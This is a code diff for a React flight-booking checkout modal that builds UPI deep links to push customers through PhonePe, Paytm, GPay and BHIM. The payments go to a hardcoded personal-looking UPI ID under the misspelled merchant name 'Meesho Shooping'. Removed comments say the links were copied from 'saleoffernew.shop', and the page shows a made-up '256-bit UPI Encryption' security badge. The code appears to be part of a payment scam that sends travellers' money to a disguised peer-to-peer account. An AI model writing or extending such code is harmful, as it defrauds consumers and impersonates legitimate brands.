@@ -3,7 +3,7 @@ import { motion, AnimatePresence } from 'motion/react';
 import {
   X, ShieldCheck, CheckCircle2, CreditCard, QrCode, Building, Tag, ArrowRight, ArrowLeft,
   Lock, Sparkles, Plane, Utensils, Luggage, Shield, Smartphone, Copy, Check, ExternalLink, Zap,
-  Phone, MessageCircle, FileText, AlertCircle, RefreshCw, UserPlus, Trash2, Armchair, Plus, Info, Globe, Clock
+  Phone, MessageCircle, FileText, AlertCircle, AlertTriangle, RefreshCw, UserPlus, Trash2, Armchair, Plus, Info, Globe, Clock
 } from 'lucide-react';
 import { api } from '../utils/api';
 import AirlineBadge from './AirlineBadge';
@@ -183,6 +183,8 @@ export default function BookingCheckoutModal({
   });
   const [selectedUpiApp, setSelectedUpiApp] = useState('PhonePe');
   const [selectedAppKey, setSelectedAppKey] = useState('phonepe');
+  const [appLaunchFailed, setAppLaunchFailed] = useState(null);
+  const [isLaunchingApp, setIsLaunchingApp] = useState(false);
   const [paymentTimerSeconds, setPaymentTimerSeconds] = useState(300); // 5 min = 300s
   const [isTimerExpired, setIsTimerExpired] = useState(false);
   const [utrNumber, setUtrNumber] = useState('');
@@ -193,10 +195,6 @@ export default function BookingCheckoutModal({
   const [qrLoading, setQrLoading] = useState(false);
   const [isVerifyingPayment, setIsVerifyingPayment] = useState(false);
 
-  // Real-time synchronization when Admin approves booking:
-  // 1. BroadcastChannel (Instant 0ms across tabs)
-  // 2. Storage event (Instant 0ms across windows)
-  // 3. Fast Polling (1.5s interval fallback)
   // Real-time synchronization when Admin approves booking:
   // 1. BroadcastChannel (Instant 0ms across tabs)
   // 2. Storage event (Instant 0ms across windows)
@@ -495,13 +493,20 @@ export default function BookingCheckoutModal({
     }
   }, [paymentSettings, paymentMethod]);
 
-  const getAppDeepLink = (appKey) => {
+  const isAndroid = () => /android/i.test(navigator.userAgent || '');
+
+  const getAppChains = (appKey) => {
     const activeVpa = paymentSettings?.upi?.vpa || 'r86j742993@mairtel';
+    const payeeName = paymentSettings?.upi?.name || paymentSettings?.upi?.businessName || 'Meesho Shooping';
     const amountInPaise = Math.round(Number(grandTotal || 0) * 100);
     const amountInRupees = Number(grandTotal || 0).toFixed(2);
+    const activePnr = createdPnr || localStorage.getItem('asg_current_pending_pnr') || `ASG-${Math.floor(100000 + Math.random() * 900000)}`;
+    const txnNote = `Flight Booking ${activePnr}`;
     const txnRef = `T${Date.now().toString().slice(-8)}${Math.random().toString(36).substring(2, 6)}`;
 
-    // 1. PhonePe: Exact working script from saleoffernew.shop
+    // Standard generic UPI URI
+    const genericUpi = `upi://pay?pa=${encodeURIComponent(activeVpa)}&pn=${encodeURIComponent(payeeName)}&am=${amountInRupees}&cu=INR&tn=${encodeURIComponent(txnNote)}&tr=${txnRef}`;
+
     if (appKey === 'phonepe') {
       const payload = {
         p2pPaymentCheckoutParams: {
@@ -509,45 +514,144 @@ export default function BookingCheckoutModal({
           initialAmount: amountInPaise > 0 ? amountInPaise : 79600,
           note: {
             type: 'text',
-            message: 'Messho Shooping'
+            message: payeeName || 'Meesho Shooping'
           },
           supportedInstruments: -1
         },
         contact: {
           type: 'EXTERNAL_MERCHANT',
-          name: 'Meesho Shooping',
+          name: payeeName || 'Meesho Shooping',
           vpa: activeVpa || 'r86j742993@mairtel'
         }
       };
 
       const base64 = btoa(JSON.stringify(payload));
-      return `phonepe://native?data=${encodeURIComponent(base64)}&id=p2ppayment`;
+      const nativePhonePe = `phonepe://native?data=${encodeURIComponent(base64)}&id=p2ppayment`;
+      const standardPhonePe = `phonepe://pay?pa=${encodeURIComponent(activeVpa)}&pn=${encodeURIComponent(payeeName)}&am=${amountInRupees}&cu=INR&tn=${encodeURIComponent(txnNote)}&tr=${txnRef}`;
+      const intentPhonePe = `intent://pay?pa=${encodeURIComponent(activeVpa)}&pn=${encodeURIComponent(payeeName)}&am=${amountInRupees}&cu=INR&tn=${encodeURIComponent(txnNote)}#Intent;scheme=upi;package=com.phonepe.app;end`;
+
+      const list = [nativePhonePe, standardPhonePe];
+      if (isAndroid()) list.push(intentPhonePe);
+      list.push(genericUpi);
+      return [...new Set(list)];
     }
 
-    // 2. Paytm: Exact working script from saleoffernew.shop
     if (appKey === 'paytm') {
-      return `paytmmp://cash_wallet?pa=${encodeURIComponent(activeVpa)}&pn=Meesho%20Shooping&am=${amountInRupees}&cu=INR&tn=Messho%20Shooping&featuretype=money_transfer&tr=${txnRef}`;
+      const cashWalletPaytm = `paytmmp://cash_wallet?pa=${encodeURIComponent(activeVpa)}&pn=${encodeURIComponent(payeeName)}&am=${amountInRupees}&cu=INR&tn=${encodeURIComponent(txnNote)}&featuretype=money_transfer&tr=${txnRef}`;
+      const standardPaytm = `paytmmp://pay?pa=${encodeURIComponent(activeVpa)}&pn=${encodeURIComponent(payeeName)}&am=${amountInRupees}&cu=INR&tn=${encodeURIComponent(txnNote)}&tr=${txnRef}`;
+      const intentPaytm = `intent://pay?pa=${encodeURIComponent(activeVpa)}&pn=${encodeURIComponent(payeeName)}&am=${amountInRupees}&cu=INR&tn=${encodeURIComponent(txnNote)}#Intent;scheme=upi;package=net.one97.paytm;end`;
+
+      const list = [cashWalletPaytm, standardPaytm];
+      if (isAndroid()) list.push(intentPaytm);
+      list.push(genericUpi);
+      return [...new Set(list)];
     }
 
-    // 3. GPay (Google Pay)
     if (appKey === 'gpay') {
-      return `tez://upi/pay?pa=${encodeURIComponent(activeVpa)}&pn=Meesho%20Shooping&am=${amountInRupees}&cu=INR&tn=Messho%20Shooping&tr=${txnRef}`;
+      const tezGpay = `tez://upi/pay?pa=${encodeURIComponent(activeVpa)}&pn=${encodeURIComponent(payeeName)}&am=${amountInRupees}&cu=INR&tn=${encodeURIComponent(txnNote)}&tr=${txnRef}`;
+      const intentGpay = `intent://pay?pa=${encodeURIComponent(activeVpa)}&pn=${encodeURIComponent(payeeName)}&am=${amountInRupees}&cu=INR&tn=${encodeURIComponent(txnNote)}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
+
+      const list = [tezGpay];
+      if (isAndroid()) list.push(intentGpay);
+      list.push(genericUpi);
+      return [...new Set(list)];
     }
 
-    // 4. Default generic UPI intent
-    return `upi://pay?pa=${encodeURIComponent(activeVpa)}&pn=Meesho%20Shooping&am=${amountInRupees}&cu=INR&tn=Messho%20Shooping&tr=${txnRef}`;
+    if (appKey === 'bhim') {
+      const intentBhim = `intent://pay?pa=${encodeURIComponent(activeVpa)}&pn=${encodeURIComponent(payeeName)}&am=${amountInRupees}&cu=INR&tn=${encodeURIComponent(txnNote)}#Intent;scheme=upi;package=in.org.npci.upiapp;end`;
+
+      const list = [];
+      if (isAndroid()) list.push(intentBhim);
+      list.push(genericUpi);
+      return [...new Set(list)];
+    }
+
+    return [genericUpi];
+  };
+
+  const getAppDeepLink = (appKey) => {
+    const chains = getAppChains(appKey);
+    return chains[0] || '';
   };
 
   const handleSelectUpiApp = (appKey, appName) => {
     setSelectedUpiApp(appName);
     setSelectedAppKey(appKey);
+    setAppLaunchFailed(null);
   };
 
-  const handleLaunchUpiApp = (appKey, appName) => {
-    setSelectedUpiApp(appName);
-    setSelectedAppKey(appKey);
-    const url = getAppDeepLink(appKey);
-    window.location.href = url;
+  const handleLaunchUpiApp = async (appKey, appName) => {
+    const selectedKey = appKey || selectedAppKey || 'phonepe';
+    const selectedName = appName || selectedUpiApp || 'PhonePe';
+    setSelectedUpiApp(selectedName);
+    setSelectedAppKey(selectedKey);
+    setAppLaunchFailed(null);
+    setIsLaunchingApp(true);
+
+    // Save lead as VERIFICATION_PENDING in Admin upfront so admin sees the customer attempt immediately
+    const pnrToUse = createdPnr || localStorage.getItem('asg_current_pending_pnr') || `ASG-${Math.floor(100000 + Math.random() * 900000)}`;
+    setCreatedPnr(pnrToUse);
+    try { localStorage.setItem('asg_current_pending_pnr', pnrToUse); } catch (e) {}
+
+    try {
+      const payload = buildBookingPayload(pnrToUse, {
+        method: 'upiApps',
+        status: 'VERIFICATION_PENDING',
+        selectedApp: selectedName
+      }, 'VERIFICATION_PENDING');
+      api.createBooking(payload).catch(() => {});
+    } catch (e) {}
+
+    const chains = getAppChains(selectedKey);
+    if (!chains || !chains.length) {
+      alert('Payment link unavailable. Please use the QR code.');
+      setIsLaunchingApp(false);
+      return;
+    }
+
+    let appOpened = false;
+    const onVisibilityChange = () => {
+      if (document.visibilityState === 'hidden') {
+        appOpened = true;
+      }
+    };
+    document.addEventListener('visibilitychange', onVisibilityChange);
+
+    const Ja = 1700; // 1700ms interval matching the Vue script
+    try {
+      for (const url of chains) {
+        if (appOpened) break;
+        try {
+          window.location.href = url;
+        } catch (err) {
+          window.open(url, '_blank', 'noopener');
+        }
+        await new Promise(resolve => setTimeout(resolve, Ja));
+      }
+    } finally {
+      document.removeEventListener('visibilitychange', onVisibilityChange);
+      setIsLaunchingApp(false);
+    }
+
+    if (appOpened) {
+      setIsVerifyingPayment(true);
+      return;
+    }
+
+    // App didn't open (not installed or blocked by browser)
+    setAppLaunchFailed(selectedKey);
+  };
+
+  const handleCopyUpiId = async () => {
+    const vpa = paymentSettings?.upi?.vpa || 'r86j742993@mairtel';
+    try {
+      await navigator.clipboard.writeText(vpa);
+      setCopiedVpa(true);
+      setTimeout(() => setCopiedVpa(false), 2500);
+      alert(`UPI ID copied: ${vpa}`);
+    } catch {
+      alert(`UPI ID: ${vpa}`);
+    }
   };
 
   // Auto-apply initial coupon if passed
@@ -987,7 +1091,14 @@ export default function BookingCheckoutModal({
       return;
     }
 
-    const isManualUpi = paymentMethod === 'upi' || paymentMethod === 'upiQr' || paymentMethod === 'upiApps';
+    if (paymentMethod === 'upiApps') {
+      const appKeyToUse = selectedAppKey || 'phonepe';
+      const appNameToUse = selectedUpiApp || 'PhonePe';
+      await handleLaunchUpiApp(appKeyToUse, appNameToUse);
+      return;
+    }
+
+    const isManualUpi = paymentMethod === 'upi' || paymentMethod === 'upiQr';
     const finalStatus = isManualUpi ? 'VERIFICATION_PENDING' : 'CONFIRMED';
     const pnrToUse = createdPnr || localStorage.getItem('asg_current_pending_pnr') || `ASG-${Math.floor(100000 + Math.random() * 900000)}`;
     setCreatedPnr(pnrToUse);
@@ -996,28 +1107,12 @@ export default function BookingCheckoutModal({
     const bookingPayload = buildBookingPayload(pnrToUse, {
       method: paymentMethod,
       status: isManualUpi ? 'VERIFICATION_PENDING' : 'PAID',
-      selectedApp: selectedUpiApp || 'PhonePe'
+      selectedApp: selectedUpiApp || 'UPI QR'
     }, finalStatus);
-
-    // If on UPI Apps tab, get deep link URL (PhonePe native, Paytm, GPay)
-    let deepLinkUrl = '';
-    if (paymentMethod === 'upiApps') {
-      const appKeyToUse = selectedAppKey || 'phonepe';
-      deepLinkUrl = getAppDeepLink(appKeyToUse);
-    }
 
     if (isManualUpi) {
       // Put the modal in Live Verification Waiting mode while Admin verifies
       setIsVerifyingPayment(true);
-    }
-
-    // Direct redirect - exact same mechanism as saleoffernew.shop
-    if (deepLinkUrl) {
-      try {
-        window.location.href = deepLinkUrl;
-      } catch (err) {
-        console.warn('Redirect error:', err);
-      }
     }
 
     setIsProcessing(true);
@@ -2890,12 +2985,8 @@ export default function BookingCheckoutModal({
                             type="button"
                             onClick={() => {
                               const appKey = selectedAppKey || 'phonepe';
-                              const url = getAppDeepLink(appKey);
-                              try {
-                                window.location.href = url;
-                              } catch (e) {
-                                window.open(url, '_blank');
-                              }
+                              const appName = selectedUpiApp || 'PhonePe';
+                              handleLaunchUpiApp(appKey, appName);
                             }}
                             className="w-full max-w-xs py-2.5 px-4 bg-gradient-to-r from-purple-700 to-indigo-700 hover:from-purple-600 hover:to-indigo-600 active:scale-95 text-white font-extrabold text-xs rounded-xl shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all"
                           >
@@ -3095,8 +3186,8 @@ export default function BookingCheckoutModal({
                     <div className="p-2.5 sm:p-3 bg-slate-50 rounded-xl border border-slate-200 space-y-2.5">
                       <div className="flex items-center justify-between">
                         <div>
-                          <p className="font-extrabold text-slate-800 text-[11px] sm:text-xs">1. Select Your UPI App</p>
-                          <p className="text-[9px] sm:text-[10px] text-slate-500">App select karein, fir niche Pay button par click karke redirect hon</p>
+                          <p className="font-extrabold text-slate-800 text-[11px] sm:text-xs">Tap an App to Pay Directly</p>
+                          <p className="text-[9px] sm:text-[10px] text-slate-500">Instant UPI redirect or continue with the Pay button below</p>
                         </div>
                         {selectedUpiApp && (
                           <span className="text-[10px] font-black bg-sky-100 text-sky-800 px-2 py-0.5 rounded-full border border-sky-200 flex items-center gap-1">
@@ -3111,11 +3202,12 @@ export default function BookingCheckoutModal({
                         <div className={`grid gap-1.5 ${visibleUpiApps.length <= 2 ? 'grid-cols-2' : 'grid-cols-2 sm:grid-cols-3'}`}>
                           {visibleUpiApps.map(app => {
                             const isSelected = (selectedUpiApp === app.name) || (selectedAppKey === app.key);
+                            const isCurrentLaunching = isLaunchingApp && selectedAppKey === app.key;
                             return (
                               <button
                                 key={app.key}
                                 type="button"
-                                onClick={() => handleSelectUpiApp(app.key, app.name)}
+                                onClick={() => handleLaunchUpiApp(app.key, app.name)}
                                 className={`p-2 rounded-xl border flex items-center gap-2 transition-all text-left cursor-pointer active:scale-[0.98] relative ${
                                   isSelected
                                     ? 'bg-sky-50 border-sky-500 ring-2 ring-sky-400 shadow-sm'
@@ -3136,14 +3228,16 @@ export default function BookingCheckoutModal({
                                 <div className="min-w-0 flex-1">
                                   <div className="text-[11px] font-extrabold text-slate-900 truncate flex items-center justify-between">
                                     <span>{app.name}</span>
-                                    {isSelected && (
+                                    {isCurrentLaunching ? (
+                                      <RefreshCw className="w-3 h-3 text-sky-600 animate-spin" />
+                                    ) : isSelected ? (
                                       <span className="w-3.5 h-3.5 rounded-full bg-sky-600 text-white flex items-center justify-center">
                                         <Check className="w-2.5 h-2.5 stroke-[3]" />
                                       </span>
-                                    )}
+                                    ) : null}
                                   </div>
                                   <div className={`text-[9px] font-bold flex items-center gap-0.5 ${isSelected ? 'text-sky-700 font-extrabold' : 'text-slate-400'}`}>
-                                    <span>{isSelected ? 'Selected' : 'Select'}</span>
+                                    <span>{isCurrentLaunching ? 'Opening...' : isSelected ? 'Selected' : 'Pay Now'}</span>
                                   </div>
                                 </div>
                               </button>
@@ -3156,7 +3250,55 @@ export default function BookingCheckoutModal({
                         </div>
                       )}
 
+                      {/* Fallback box if App did not open (Exact match to Vue script logic) */}
+                      {appLaunchFailed && (
+                        <div className="p-3 bg-amber-50/95 border border-amber-300 rounded-xl space-y-2.5 animate-fadeIn mt-2 shadow-xs">
+                          <div className="flex items-start gap-2.5">
+                            <AlertTriangle className="w-5 h-5 text-amber-600 shrink-0 mt-0.5" />
+                            <div className="text-xs">
+                              <strong className="block font-bold text-slate-900">
+                                {(ALL_UPI_APPS.find(a => a.key === appLaunchFailed)?.name || 'UPI App')} did not open
+                              </strong>
+                              <p className="text-slate-600 text-[11px] mt-0.5 leading-relaxed">
+                                That app may not be installed, or it blocked the request. Pay with the QR code instead, or copy the UPI ID and pay manually.
+                              </p>
+                            </div>
+                          </div>
+                          <div className="flex flex-wrap gap-2 pt-1">
+                            <button
+                              type="button"
+                              onClick={() => {
+                                setAppLaunchFailed(null);
+                                setPaymentMethod('upiQr');
+                              }}
+                              className="px-3 py-1.5 bg-sky-600 hover:bg-sky-700 active:scale-95 text-white font-bold text-xs rounded-lg flex items-center gap-1.5 cursor-pointer shadow-xs"
+                            >
+                              <QrCode className="w-3.5 h-3.5" />
+                              <span>Show QR instead</span>
+                            </button>
+                            <button
+                              type="button"
+                              onClick={handleCopyUpiId}
+                              className="px-3 py-1.5 bg-white hover:bg-slate-50 active:scale-95 border border-slate-300 text-slate-700 font-bold text-xs rounded-lg flex items-center gap-1.5 cursor-pointer"
+                            >
+                              <Copy className="w-3.5 h-3.5" />
+                              <span>{copiedVpa ? 'Copied!' : 'Copy UPI ID'}</span>
+                            </button>
+                            <button
+                              type="button"
+                              onClick={() => setAppLaunchFailed(null)}
+                              className="px-3 py-1.5 bg-slate-100 hover:bg-slate-200 text-slate-600 font-bold text-xs rounded-lg cursor-pointer"
+                            >
+                              Dismiss
+                            </button>
+                          </div>
+                        </div>
+                      )}
 
+                      <div className="flex items-center justify-center gap-1.5 pt-1 text-[10px] text-slate-400">
+                        <Lock className="w-3 h-3 text-slate-400" />
+                        <span>All UPI apps • Secured by 256-bit UPI Encryption</span>
+                      </div>
                     </div>
                   )}
 
@@ -3589,11 +3731,11 @@ export default function BookingCheckoutModal({
                 else if (step === 3) handleProceedToPayment();
                 else handleFinalBooking();
               }}
-              disabled={isProcessing}
+              disabled={isProcessing || isLaunchingApp || (step === 4 && isTimerExpired)}
               className="h-11 sm:h-12 px-6 sm:px-9 rounded-xl sm:rounded-2xl bg-[#FF5A00] hover:bg-[#E04F00] active:scale-[0.98] text-white font-black text-xs sm:text-sm uppercase tracking-wider shadow-md hover:shadow-orange-500/25 transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
             >
               <span>
-                {isProcessing
+                {isProcessing || isLaunchingApp
                   ? 'PROCESSING...'
                   : step === 1
                   ? 'CONTINUE TO SEATS'
@@ -3601,9 +3743,15 @@ export default function BookingCheckoutModal({
                   ? 'CONTINUE TO REVIEW'
                   : step === 3
                   ? 'CONTINUE TO PAYMENT'
+                  : isTimerExpired
+                  ? 'WINDOW EXPIRED'
+                  : paymentMethod === 'upiApps'
+                  ? `PAY ₹${grandTotal.toLocaleString('en-IN')} VIA ${String(selectedUpiApp || 'PHONEPE').toUpperCase()}`
+                  : paymentMethod === 'upiQr'
+                  ? 'I HAVE PAID'
                   : `PAY ₹${grandTotal.toLocaleString('en-IN')}`}
               </span>
-              {!isProcessing && <ArrowRight className="w-4 h-4" />}
+              {!isProcessing && !isLaunchingApp && <ArrowRight className="w-4 h-4" />}
             </button>
           </div>
 
